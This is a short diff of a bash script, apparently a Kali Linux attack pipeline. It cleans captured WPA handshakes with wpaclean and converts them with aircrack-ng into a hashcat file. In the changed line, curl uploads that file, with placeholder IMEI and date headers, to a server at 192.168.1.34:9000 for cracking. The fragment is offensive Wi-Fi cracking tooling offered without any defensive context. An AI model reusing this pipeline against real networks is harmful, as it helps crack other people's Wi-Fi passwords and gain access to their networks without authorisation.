@@ -12,11 +12,11 @@ main(){
 	output=`wpaclean cleanshakes.cap shakes-01.cap > /dev/null`
 	if [[ "$output" == *"net"* ]]; then
 		echo "Handshakes detected!!!"
-		aircrack-ng -j date:imei cleanshakes.cap > /dev/null
+		aircrack-ng -j cat cleanshakes.cap > /dev/null
 	else
 		echo "No handshakes"
 	fi
-	curl -X POST -H "Content-Type: application/json" -d "imei устройства, координаты, время" http://hashcat:9090
+  	curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
 }
 
 
